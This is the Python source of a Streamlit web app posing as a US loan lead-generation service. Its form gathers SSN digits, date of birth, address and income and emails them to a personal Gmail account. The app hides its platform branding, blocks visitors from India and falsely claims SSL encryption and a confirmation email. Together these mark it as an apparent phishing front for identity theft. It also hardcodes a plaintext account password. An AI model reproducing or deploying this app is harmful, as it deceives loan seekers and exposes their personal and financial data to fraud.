import streamlit as st
import pandas as pd
import datetime
import hashlib
import uuid
import re
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

# ============================================
# PAGE CONFIG
# ============================================
st.set_page_config(
    page_title="Heritage Trust Leads | US Lead Generation",
    page_icon="🇺🇸",
    layout="wide"
)

# ============================================
# HIDE ALL STREAMLIT UI
# ============================================
st.markdown("""
<style>
    #MainMenu {visibility: hidden !important;}
    header {visibility: hidden !important;}
    footer {visibility: hidden !important;}
    .stAppDeployButton {display: none !important;}
    .stActionButton {display: none !important;}
    .stToolbar {display: none !important;}
    .stStatusWidget {display: none !important;}
    .st-emotion-cache-1v0mbdj {display: none !important;}
    .st-emotion-cache-1inwz65 {display: none !important;}
    .viewerBadge_link__qRIco {display: none !important;}
    a[href*="github"] {display: none !important;}
    a[href*="streamlit"] {display: none !important;}
    [data-testid="stStatusWidget"] {display: none !important;}
    .stDeployButton {display: none !important;}
</style>
""", unsafe_allow_html=True)

# ============================================
# IP BLOCKING - BLOCK INDIA
# ============================================
def is_indian_ip():
    try:
        import requests
        response = requests.get('https://ipapi.co/json/', timeout=5)
        data = response.json()
        country = data.get('country_code', '')
        return country == 'IN'
    except:
        return False

if is_indian_ip():
    st.error("🚫 This service is not available in your region.")
    st.stop()

# ============================================
# CONFIGURATION
# ============================================
COMPANY_NAME = "Heritage Trust Leads"
COMPANY_PHONE = "(225) 244-9281"
COMPANY_WHATSAPP = "941 879 6129"
COMPANY_EMAIL = "turnerjack779@gmail.com"

# Admin credentials
ADMIN_EMAIL = "turnerjack779@gmail.com"
ADMIN_PASSWORD = "Wasu1234$"

# Email config (for sending alerts)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
SMTP_USERNAME = "turnerjack779@gmail.com"
SMTP_PASSWORD = "Wasu1234$"  # Use App Password

# US States
US_STATES = [
    "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
    "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky",
    "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
    "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico",
    "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
    "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont",
    "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"
]

# Loan Providers (US Banks)
LOAN_PROVIDERS = [
    "🏦 Wells Fargo",
    "🏦 Chase Bank",
    "🏦 Bank of America",
    "🏦 CitiBank",
    "🏦 U.S. Bank",
    "🏦 PNC Bank",
    "🏦 Truist Bank",
    "🏦 Capital One",
    "🏦 American Express",
    "🏦 Discover",
    "🏦 SoFi",
    "🏦 LendingClub",
    "🏦 Upgrade",
    "🏦 Best Egg",
    "🏦 LightStream"
]

LOAN_TYPES = [
    "Personal Loan",
    "Home Loan / Mortgage",
    "Auto Loan",
    "Business Loan",
    "Student Loan",
    "Debt Consolidation",
    "Credit Card",
    "Medical Loan"
]

# ============================================
# EMAIL FUNCTION
# ============================================
def send_email_alert(lead_data):
    """Send email alert to admin"""
    try:
        msg = MIMEMultipart()
        msg['From'] = COMPANY_EMAIL
        msg['To'] = COMPANY_EMAIL
        msg['Subject'] = f"🔔 New Lead: {lead_data['name']} - {lead_data['loan_amount']}"

        body = f"""
        🆕 NEW LEAD RECEIVED!
        
        📝 Lead ID: {lead_data['lead_id']}
        📅 Date: {lead_data['timestamp']}
        
        👤 CUSTOMER DETAILS:
        ---------------------
        Name: {lead_data['name']}
        Email: {lead_data['email']}
        Phone: {lead_data['phone']}
        SSN (Last 4): ***-**-{lead_data['ssn_last4']}
        DOB: {lead_data['dob']}
        
        📍 ADDRESS:
        ------------
        {lead_data['address']}
        {lead_data['city']}, {lead_data['state']} {lead_data['zip']}
        
        💰 LOAN DETAILS:
        -----------------
        Loan Provider: {lead_data['loan_provider']}
        Loan Type: {lead_data['loan_type']}
        Loan Amount: ${lead_data['loan_amount']:,}
        Employment: {lead_data['employment']}
        Annual Income: ${lead_data['income']:,}
        
        🌐 IP: {lead_data['ip']}
        
        ========================================
        Heritage Trust Leads - Lead Generation
        ========================================
        """
        
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

# ============================================
# DATABASE
# ============================================
if 'leads' not in st.session_state:
    st.session_state.leads = []

if 'users' not in st.session_state:
    st.session_state.users = {
        ADMIN_EMAIL: {
            "password": hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest(),
            "user_type": "admin",
            "name": "Admin"
        }
    }

if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
    st.session_state.user_data = None

# ============================================
# VALIDATION FUNCTIONS
# ============================================
def hash_password(pwd):
    return hashlib.sha256(pwd.encode()).hexdigest()

def validate_phone(phone):
    phone_clean = re.sub(r'[^\d]', '', phone)
    return len(phone_clean) == 10

def validate_zip(zip_code):
    return re.match(r'^\d{5}$', zip_code) is not None

def get_client_ip():
    try:
        import requests
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unknown'

# ============================================
# LEAD CAPTURE
# ============================================
def capture_lead(data):
    lead_id = str(uuid.uuid4())[:8]
    lead = {
        'id': len(st.session_state.leads) + 1,
        'lead_id': lead_id,
        'name': data['name'],
        'email': data['email'],
        'phone': data['phone'],
        'ssn_last4': data['ssn_last4'],
        'dob': data['dob'],
        'address': data['address'],
        'city': data['city'],
        'state': data['state'],
        'zip': data['zip'],
        'loan_provider': data['loan_provider'],
        'loan_type': data['loan_type'],
        'loan_amount': data['loan_amount'],
        'employment': data['employment'],
        'income': data['income'],
        'consent': data['consent'],
        'ip': get_client_ip(),
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'New'
    }
    st.session_state.leads.insert(0, lead)
    
    # Send email alert
    send_email_alert(lead)
    
    return lead

# ============================================
# PUBLIC LEAD FORM
# ============================================
def show_lead_form():
    st.markdown(f"""
    <div style="background: linear-gradient(135deg, #0a2f44 0%, #1e4a6e 100%); padding: 2rem; border-radius: 20px; text-align: center; margin-bottom: 2rem;">
        <h1 style="color: white; font-size: 1.8rem;">🏛️ {COMPANY_NAME}</h1>
        <p style="color: #ffc107; font-size: 1.1rem;">We Match You With Trusted US Lenders</p>
        <p style="color: white;">One application. Multiple offers. Best rates.</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown(f"""
    <div style="background: #e8f4fd; padding: 1rem; border-radius: 10px; margin-bottom: 1rem;">
        <p>🔍 <b>How it works:</b> Fill out the form → We match with lenders → Compare offers → Choose best rate</p>
        <p style="font-size: 0.8rem;">📞 Questions? Call: <b>{COMPANY_PHONE}</b> | WhatsApp: <b>{COMPANY_WHATSAPP}</b></p>
    </div>
    """, unsafe_allow_html=True)
    
    with st.form("lead_form"):
        st.markdown("### 📝 Personal Information")
        
        col1, col2 = st.columns(2)
        with col1:
            name = st.text_input("Full Name *", placeholder="John Doe")
            email = st.text_input("Email Address *", placeholder="john@example.com")
            phone = st.text_input("Phone Number *", placeholder="(555) 123-4567")
            ssn_last4 = st.text_input("SSN Last 4 Digits *", placeholder="1234", max_chars=4)
        with col2:
            dob = st.date_input("Date of Birth *", min_value=datetime(1920, 1, 1), max_value=datetime(2006, 1, 1))
            address = st.text_input("Street Address *", placeholder="123 Main St")
            city = st.text_input("City *", placeholder="Los Angeles")
            state = st.selectbox("State *", US_STATES)
            zip_code = st.text_input("ZIP Code *", placeholder="90210")
        
        st.markdown("---")
        st.markdown("### 💰 Loan Details")
        
        col1, col2 = st.columns(2)
        with col1:
            loan_provider = st.selectbox("Preferred Lender *", ["Any Lender"] + LOAN_PROVIDERS)
            loan_type = st.selectbox("Loan Type *", LOAN_TYPES)
        with col2:
            loan_amount = st.number_input("Loan Amount (USD) *", min_value=1000, max_value=100000, value=10000, step=1000)
            employment = st.selectbox("Employment Status *", ["Employed Full-Time", "Employed Part-Time", "Self-Employed", "Retired", "Unemployed"])
            income = st.number_input("Annual Income (USD) *", min_value=0, max_value=500000, value=50000, step=5000)
        
        st.markdown("---")
        st.markdown("### 📋 Consent")
        
        st.markdown("""
        <div style="background: #f8f9fa; padding: 1rem; border-radius: 8px; font-size: 0.85rem;">
            <p>By submitting this application, I authorize <b>Heritage Trust Leads</b> to share my information with partner lenders. I understand that:</p>
            <ul>
                <li>This is a lead generation service, not a lender</li>
                <li>Lenders may contact me regarding loan offers</li>
                <li>Completing this form does not guarantee approval</li>
            </ul>
        </div>
        """, unsafe_allow_html=True)
        
        consent = st.checkbox("I agree to receive loan offers from partner lenders *")
        
        st.markdown(f"""
        <div style="font-size: 0.7rem; color: #666; text-align: center; margin-top: 1rem;">
            <p>🔒 Secure Application | 256-bit SSL Encryption</p>
            <p>📞 {COMPANY_PHONE} | 💬 {COMPANY_WHATSAPP} | 📧 {COMPANY_EMAIL}</p>
        </div>
        """, unsafe_allow_html=True)
        
        submitted = st.form_submit_button("Get My Loan Offers →", use_container_width=True, type="primary")
        
        if submitted:
            errors = []
            if not name:
                errors.append("Name required")
            if not email:
                errors.append("Email required")
            if not validate_phone(phone):
                errors.append("Valid US phone number required (10 digits)")
            if not ssn_last4 or len(ssn_last4) != 4 or not ssn_last4.isdigit():
                errors.append("Valid SSN last 4 digits required")
            if not validate_zip(zip_code):
                errors.append("Valid ZIP code required")
            if not consent:
                errors.append("You must agree to receive loan offers")
            
            if errors:
                for err in errors:
                    st.error(f"❌ {err}")
            else:
                lead_data = {
                    'name': name, 'email': email, 'phone': phone,
                    'ssn_last4': ssn_last4, 'dob': str(dob),
                    'address': address, 'city': city, 'state': state, 'zip': zip_code,
                    'loan_provider': loan_provider, 'loan_type': loan_type,
                    'loan_amount': loan_amount, 'employment': employment,
                    'income': income, 'consent': consent
                }
                capture_lead(lead_data)
                st.success(f"✅ Thank you {name}! Your application has been submitted.")
                st.balloons()
                st.info(f"📞 Partner lenders will contact you within 24 hours at {phone}")
                st.markdown(f"<div style='background: #d4edda; padding: 1rem; border-radius: 8px;'>📧 A confirmation has been sent to {email}</div>", unsafe_allow_html=True)

# ============================================
# LOGIN PAGE
# ============================================
def show_login():
    st.markdown(f"""
    <div style="background: linear-gradient(135deg, #0a2f44 0%, #1e4a6e 100%); padding: 2rem; border-radius: 20px; text-align: center; margin-bottom: 2rem;">
        <h1 style="color: white;">🏛️ {COMPANY_NAME}</h1>
        <p style="color: white;">Partner Portal</p>
    </div>
    """, unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        st.markdown("### 🔐 Portal Login")
        
        with st.form("login_form"):
            email = st.text_input("Email")
            password = st.text_input("Password", type="password")
            
            if st.form_submit_button("Login", use_container_width=True):
                if email in st.session_state.users:
                    user = st.session_state.users[email]
                    if user["password"] == hash_password(password):
                        st.session_state.logged_in = True
                        st.session_state.user_data = user
                        st.success(f"✅ Welcome {user['name']}!")
                        st.rerun()
                    else:
                        st.error("Invalid password")
                else:
                    st.error("User not found")

# ============================================
# ADMIN DASHBOARD
# ============================================
def show_admin_dashboard():
    st.markdown(f"""
    <div style="background: linear-gradient(135deg, #0a2f44 0%, #1e4a6e 100%); padding: 1rem; border-radius: 15px; margin-bottom: 1rem;">
        <h2 style="color: white;">👑 Admin Dashboard</h2>
        <p style="color: white;">Total Leads: {len(st.session_state.leads)}</p>
    </div>
    """, unsafe_allow_html=True)
    
    tab1, tab2 = st.tabs(["📊 All Leads", "📈 Stats"])
    
    with tab1:
        if st.session_state.leads:
            df = pd.DataFrame(st.session_state.leads)
            display_df = df[['lead_id', 'name', 'email', 'phone', 'ssn_last4', 'city', 'state', 'loan_provider', 'loan_type', 'loan_amount', 'income', 'timestamp']]
            st.dataframe(display_df, use_container_width=True, hide_index=True)
            
            col1, col2 = st.columns(2)
            with col1:
                if st.button("📥 Export to CSV"):
                    csv = df.to_csv(index=False)
                    st.download_button("Download CSV", csv, "heritage_leads.csv", "text/csv")
            with col2:
                total_amount = sum(l.get('loan_amount', 0) for l in st.session_state.leads)
                st.metric("💰 Total Loan Requests", f"${total_amount:,}")
        else:
            st.info("No leads captured yet")
    
    with tab2:
        if st.session_state.leads:
            col1, col2 = st.columns(2)
            with col1:
                st.markdown("#### Loan Provider Preference")
                provider_counts = {}
                for lead in st.session_state.leads:
                    p = lead.get('loan_provider', 'Any')
                    provider_counts[p] = provider_counts.get(p, 0) + 1
                if provider_counts:
                    st.bar_chart(provider_counts)
            
            with col2:
                st.markdown("#### State Distribution")
                state_counts = {}
                for lead in st.session_state.leads:
                    state_counts[lead['state']] = state_counts.get(lead['state'], 0) + 1
                if state_counts:
                    st.bar_chart(state_counts)

# ============================================
# MAIN APP
# ============================================
with st.sidebar:
    st.markdown(f"""
    <div style="text-align: center; padding: 0.5rem;">
        <h3>🏛️ {COMPANY_NAME}</h3>
        <p style="font-size: 0.7rem;">US Lead Generation Service</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("---")
    
    if st.session_state.logged_in:
        st.markdown(f"👑 Logged in as: **{st.session_state.user_data['name']}**")
        if st.button("🚪 Logout", use_container_width=True):
            st.session_state.logged_in = False
            st.session_state.user_data = None
            st.rerun()
    else:
        if st.button("🔑 Partner Login", use_container_width=True):
            st.session_state.show_login = True
            st.rerun()

# Main content
if st.session_state.logged_in:
    show_admin_dashboard()
elif st.session_state.get('show_login', False):
    show_login()
else:
    show_lead_form()
